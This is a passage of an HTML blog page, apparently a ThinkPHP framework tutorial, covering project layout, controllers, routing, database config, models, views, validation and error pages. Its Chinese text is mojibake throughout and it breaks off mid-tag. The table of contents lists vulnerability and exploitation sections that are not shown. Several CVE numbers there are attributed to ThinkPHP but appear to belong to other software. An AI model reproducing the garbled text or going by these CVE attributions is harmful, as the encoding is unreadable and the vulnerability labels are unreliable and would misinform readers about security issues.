href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">æ—¥å¿—è®°å½•</a></li></ul></li><li><p><a href="#%E9%83%A8%E7%BD%B2">éƒ¨ç½²</a></p><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">é…ç½®ç¯å¢ƒ</a></li><li><a href="#%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8">é…ç½® Web æœåŠ¡å™¨</a></li></ul></li><li><p><a href="#thinkphp-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">ThinkPHP æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ</a></p><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">1. è·¯ç”±æœºåˆ¶</a></li></ul><p></p></li><li><p><a href="#thinkphp-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">ThinkPHP å¸¸è§çš„å®‰å…¨æ¼æ´</a></p><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">1. SQL æ³¨å…¥æ¼æ´</a>  </li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">2. è·¯å¾„éå†æ¼æ´</a>   </li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">3. è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</a>  </li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">4. ååºåˆ—åŒ–æ¼æ´</a></li></ul></li><li><p><a href="#thinkphp-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">ThinkPHP æ¼æ´åˆ©ç”¨æ–¹æ³•</a></p><ul><li><p><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">1. SQL æ³¨å…¥æ”»å‡»</a>   </p></li><li><p><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">2. è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»</a>   </p></li><li><p><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">3. è·¯å¾„éå†æ”»å‡»</a>   </p></li><li><p><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">4. ååºåˆ—åŒ–æ”»å‡»</a></p></li></ul></li><li><p><a href="#thinkphp-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">ThinkPHP å®‰å…¨é˜²å¾¡æªæ–½</a></p></li><li><p><a href="#%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">ç‰ˆæœ¬å†å²ä¸æ¼æ´æ€»ç»“</a></p></li><li><p><a href="#ctf-%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84-thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">CTF é¢˜ç›®ä¸­çš„ ThinkPHP æ¼æ´æ€»ç»“</a></p><ul><li><p><a href="#cve-2018-20062---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">1. <strong>CVE-2018-20062</strong> - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a>  </p></li><li><p><a href="#cve-2019-9082---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">2. <strong>CVE-2019-9082</strong> - ThinkPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a>   </p></li><li><p><a href="#cve-2018-19518---thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">3. <strong>CVE-2018-19518</strong> - ThinkPHP ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a>  </p></li><li><p><a href="#cve-2018-1000861---thinkphp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">4. <strong>CVE-2018-1000861</strong> - ThinkPHP æ¨¡æ¿æ³¨å…¥æ¼æ´</a>   </p></li><li><p><a href="#cve-2019-8018---thinkphp-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL æ³¨å…¥æ¼æ´</a>   </p></li><li><p><a href="#cve-2019-7481---thinkphp-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">6. <strong>CVE-2019-7481</strong> - ThinkPHP åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</a></p></li></ul></li></ol><hr><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p>ThinkPHP çš„æ ‡å‡†é¡¹ç›®ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs axapta">application/            <span class="hljs-meta"># åº”ç”¨ç›®å½•ï¼ŒåŒ…å«æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ç­‰</span><br>â”œâ”€â”€ controller/         <span class="hljs-meta"># æ§åˆ¶å™¨ç›®å½•</span><br>â”œâ”€â”€ model/              <span class="hljs-meta"># æ¨¡å‹ç›®å½•</span><br>â”œâ”€â”€ view/               <span class="hljs-meta"># è§†å›¾ç›®å½•</span><br>â”œâ”€â”€ <span class="hljs-keyword">common</span>/             <span class="hljs-meta"># å…¬å…±ç›®å½•ï¼Œå­˜æ”¾å…¬å…±ç±»ã€å‡½æ•°ç­‰</span><br>â”œâ”€â”€ config/             <span class="hljs-meta"># é…ç½®æ–‡ä»¶ç›®å½•</span><br>â”œâ”€â”€ route/              <span class="hljs-meta"># è·¯ç”±é…ç½®ç›®å½•</span><br><span class="hljs-keyword">public</span>/                 <span class="hljs-meta"># Web å…¬å¼€ç›®å½•ï¼ŒåŒ…å«å…¥å£æ–‡ä»¶</span><br>vendor/                 <span class="hljs-meta"># ç¬¬ä¸‰æ–¹ä¾èµ–åº“ï¼ˆé€šè¿‡ Composer ç®¡ç†ï¼‰</span><br>runtime/                <span class="hljs-meta"># ç¼“å­˜ã€æ—¥å¿—ç­‰ä¸´æ—¶æ–‡ä»¶ç›®å½•</span><br>thinkphp/               <span class="hljs-meta"># ThinkPHP æ ¸å¿ƒæ¡†æ¶ç›®å½•</span><br></code></pre></td></tr></table></figure><ul><li>**application&#x2F;**ï¼šå­˜æ”¾åº”ç”¨é€»è¾‘ï¼Œå¦‚æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ç­‰ã€‚</li><li>**public&#x2F;**ï¼šå­˜æ”¾é¡¹ç›®çš„å…¥å£æ–‡ä»¶ï¼ˆå¦‚ <code>index.php</code>ï¼‰å’Œå…¬å¼€èµ„æºã€‚</li><li>**runtime&#x2F;**ï¼šç”¨äºå­˜æ”¾æ—¥å¿—ã€ç¼“å­˜ç­‰ä¸´æ—¶æ–‡ä»¶ã€‚</li><li>**vendor&#x2F;**ï¼šä½¿ç”¨ Composer ç®¡ç†çš„ç¬¬ä¸‰æ–¹åº“ã€‚</li><li>**thinkphp&#x2F;**ï¼šThinkPHP æ¡†æ¶çš„æ ¸å¿ƒä»£ç ã€‚</li></ul><hr><h3 id="å¿«é€Ÿå…¥é—¨"><a href="#å¿«é€Ÿå…¥é—¨" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h3><h4 id="åˆ›å»ºæ§åˆ¶å™¨"><a href="#åˆ›å»ºæ§åˆ¶å™¨" class="headerlink" title="åˆ›å»ºæ§åˆ¶å™¨"></a>åˆ›å»ºæ§åˆ¶å™¨</h4><p><strong>æ§åˆ¶å™¨</strong> æ˜¯ ThinkPHP å¤„ç†ç”¨æˆ·è¯·æ±‚çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œè´Ÿè´£ä¸šåŠ¡é€»è¾‘çš„å¤„ç†ã€‚æ§åˆ¶å™¨æ–‡ä»¶ä½äº <code>application/controller/</code> ç›®å½•ä¸­ã€‚</p><ol><li>åœ¨ <code>application/controller/</code> ç›®å½•ä¸‹åˆ›å»ºæ§åˆ¶å™¨æ–‡ä»¶ <code>Index.php</code>ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/controller/Index.php<br></code></pre></td></tr></table></figure><ol start="2"><li>åœ¨æ§åˆ¶å™¨æ–‡ä»¶ä¸­ç¼–å†™åŸºæœ¬ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, ThinkPHP!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;World&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>è®¿é—®æ§åˆ¶å™¨ï¼š<ul><li>è®¿é—® <code>http://localhost/index.php/index/index</code> å°†ä¼šè¾“å‡º <code>Hello, ThinkPHP!</code>ã€‚</li><li>è®¿é—® <code>http://localhost/index.php/index/hello/name/ThinkPHP</code> å°†ä¼šè¾“å‡º <code>Hello, ThinkPHP!</code>ã€‚</li></ul></li></ol><hr><h4 id="é…ç½®è·¯ç”±"><a href="#é…ç½®è·¯ç”±" class="headerlink" title="é…ç½®è·¯ç”±"></a>é…ç½®è·¯ç”±</h4><p>è·¯ç”±å®šä¹‰äº† URL ä¸æ§åˆ¶å™¨&#x2F;æ–¹æ³•çš„æ˜ å°„å…³ç³»ã€‚ThinkPHP çš„è·¯ç”±é…ç½®æ–‡ä»¶ä½äº <code>route/route.php</code>ã€‚</p><ol><li>é…ç½®è·¯ç”±æ–‡ä»¶ <code>route/route.php</code>ï¼Œå®šä¹‰è·¯ç”±è§„åˆ™ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Route</span>;<br><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ª GET è·¯ç”±</span><br><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;hello/:name&#x27;</span>, <span class="hljs-string">&#x27;index/hello&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li>è®¿é—® <code>http://localhost/hello/ThinkPHP</code> å°†ä¼šè°ƒç”¨ <code>IndexController</code> ä¸­çš„ <code>hello</code> æ–¹æ³•ï¼Œå¹¶è¿”å› <code>Hello, ThinkPHP</code>ã€‚</li></ol><hr><h3 id="æ•°æ®åº“æ“ä½œ"><a href="#æ•°æ®åº“æ“ä½œ" class="headerlink" title="æ•°æ®åº“æ“ä½œ"></a>æ•°æ®åº“æ“ä½œ</h3><p>ThinkPHP æä¾›äº†å¼ºå¤§çš„ ORM åŠŸèƒ½ï¼Œæ–¹ä¾¿ä¸æ•°æ®åº“äº¤äº’ã€‚åœ¨å¼€å§‹æ•°æ®åº“æ“ä½œå‰ï¼Œé¦–å…ˆéœ€è¦é…ç½®æ•°æ®åº“è¿æ¥ã€‚</p><h4 id="é…ç½®æ•°æ®åº“"><a href="#é…ç½®æ•°æ®åº“" class="headerlink" title="é…ç½®æ•°æ®åº“"></a>é…ç½®æ•°æ®åº“</h4><ol><li>é…ç½®æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œä¿®æ”¹ <code>config/database.php</code> æ–‡ä»¶ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// æ•°æ®åº“ç±»å‹</span><br>    <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-comment">// æœåŠ¡å™¨åœ°å€</span><br>    <span class="hljs-string">&#x27;hostname&#x27;</span>    =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-comment">// æ•°æ®åº“å</span><br>    <span class="hljs-string">&#x27;database&#x27;</span>    =&gt; <span class="hljs-string">&#x27;thinkphp&#x27;</span>,<br>    <span class="hljs-comment">// ç”¨æˆ·å</span><br>    <span class="hljs-string">&#x27;username&#x27;</span>    =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-comment">// å¯†ç </span><br>    <span class="hljs-string">&#x27;password&#x27;</span>    =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-comment">// ç«¯å£</span><br>    <span class="hljs-string">&#x27;hostport&#x27;</span>    =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>];<br></code></pre></td></tr></table></figure><hr><h4 id="åˆ›å»ºæ¨¡å‹"><a href="#åˆ›å»ºæ¨¡å‹" class="headerlink" title="åˆ›å»ºæ¨¡å‹"></a>åˆ›å»ºæ¨¡å‹</h4><p>æ¨¡å‹å¯¹åº”æ•°æ®åº“è¡¨ï¼Œå¤„ç†æ•°æ®çš„å¢åˆ æ”¹æŸ¥æ“ä½œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¨¡å‹åå¯¹åº”æ•°æ®åº“è¡¨åï¼ˆå°å†™ï¼‰ã€‚</p><ol><li>åœ¨ <code>application/model/</code> ç›®å½•ä¸‹åˆ›å»ºæ¨¡å‹æ–‡ä»¶ <code>User.php</code>ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/model/User.php<br></code></pre></td></tr></table></figure><ol start="2"><li>ç¼–å†™æ¨¡å‹ç±»ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">model</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// æŒ‡å®šæ•°æ®åº“è¡¨å</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨æ¨¡å‹è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// æŸ¥è¯¢ ID ä¸º 1 çš„ç”¨æˆ·</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$user</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="è§†å›¾å’Œæ¨¡æ¿"><a href="#è§†å›¾å’Œæ¨¡æ¿" class="headerlink" title="è§†å›¾å’Œæ¨¡æ¿"></a>è§†å›¾å’Œæ¨¡æ¿</h3><p>è§†å›¾è´Ÿè´£æ˜¾ç¤ºæ•°æ®ï¼Œé€šå¸¸ç”± HTML æ¨¡æ¿ç»„æˆã€‚è§†å›¾æ–‡ä»¶å­˜æ”¾åœ¨ <code>application/view/</code> ç›®å½•ä¸‹ï¼Œæ¨¡æ¿æ–‡ä»¶çš„å‘½åéœ€ä¸æ§åˆ¶å™¨å’Œæ–¹æ³•åä¸€è‡´ã€‚</p><h4 id="åˆ›å»ºè§†å›¾æ–‡ä»¶"><a href="#åˆ›å»ºè§†å›¾æ–‡ä»¶" class="headerlink" title="åˆ›å»ºè§†å›¾æ–‡ä»¶"></a>åˆ›å»ºè§†å›¾æ–‡ä»¶</h4><ol><li>åœ¨ <code>application/view/index/</code> ç›®å½•ä¸‹åˆ›å»ºè§†å›¾æ–‡ä»¶ <code>index.html</code>ï¼š</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ThinkPHP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;$name&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="æ¸²æŸ“è§†å›¾"><a href="#æ¸²æŸ“è§†å›¾" class="headerlink" title="æ¸²æŸ“è§†å›¾"></a>æ¸²æŸ“è§†å›¾</h4><p>æ§åˆ¶å™¨å¯ä»¥é€šè¿‡ <code>view()</code> æ–¹æ³•æ¸²æŸ“è§†å›¾æ–‡ä»¶ï¼Œå¹¶ä¼ é€’æ•°æ®åˆ°è§†å›¾ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-variable">$name</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://localhost/index/index</code> æ—¶ï¼Œå°†æ˜¾ç¤º <code>Hello, ThinkPHP!</code>ã€‚</p><hr><h3 id="è¡¨å•éªŒè¯"><a href="#è¡¨å•éªŒè¯" class="headerlink" title="è¡¨å•éªŒè¯"></a>è¡¨å•éªŒè¯</h3><p>è¡¨å•éªŒè¯ç”¨äºéªŒè¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œç¡®ä¿å…¶åˆæ³•æ€§ã€‚ThinkPHP æä¾›äº†å¼ºå¤§çš„éªŒè¯æœºåˆ¶ã€‚</p><h4 id="åˆ›å»ºéªŒè¯å™¨"><a href="#åˆ›å»ºéªŒè¯å™¨" class="headerlink" title="åˆ›å»ºéªŒè¯å™¨"></a>åˆ›å»ºéªŒè¯å™¨</h4><ol><li>åœ¨ <code>application/validate/</code> ç›®å½•ä¸‹åˆ›å»ºéªŒè¯å™¨æ–‡ä»¶ <code>User.php</code>ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">validate</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Validate</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Validate</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// å®šä¹‰éªŒè¯è§„åˆ™</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$rule</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|max:25&#x27;</span>,<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;email&#x27;</span>,<br>    ];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨éªŒè¯å™¨"><a href="#ä½¿ç”¨éªŒè¯å™¨" class="headerlink" title="ä½¿ç”¨éªŒè¯å™¨"></a>ä½¿ç”¨éªŒè¯å™¨</h4><p>åœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨éªŒè¯å™¨æ¥éªŒè¯ç”¨æˆ·è¾“å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">validate</span>\<span class="hljs-title">User</span> <span class="hljs-keyword">as</span> <span class="hljs-title">UserValidate</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$data</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.name&#x27;</span>),<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.email&#x27;</span>),<br>    ];<br><br>    <span class="hljs-variable">$validate</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserValidate</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>();  <span class="hljs-comment">// è¿”å›éªŒè¯é”™è¯¯</span><br>    &#125;<br><br>    <span class="hljs-comment">// éªŒè¯é€šè¿‡åæ‰§è¡Œå…¶ä»–æ“ä½œ</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="é”™è¯¯å’Œæ—¥å¿—"><a href="#é”™è¯¯å’Œæ—¥å¿—" class="headerlink" title="é”™è¯¯å’Œæ—¥å¿—"></a>é”™è¯¯å’Œæ—¥å¿—</h3><p>ThinkPHP æä¾›äº†ç®€å•çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå¹¶æ”¯æŒæ—¥å¿—è®°å½•ã€‚</p><h4 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h4><ol><li>è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼šå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†æ¨¡æ¿ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// config/app.php</span><br><span class="hljs-string">&#x27;exception_tmpl&#x27;</span> =&gt; \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;view/error.html&#x27;</span>,<br></code></pre></td></tr></table></figure><ol start="2"><li>å®šä¹‰è‡ªå®šä¹‰çš„é”™è¯¯é¡µé¢ <code>application/view/error.html</code>ï¼š</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>An error occurred<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;$message&#125;<span class="hljs-tag">&lt;/<span 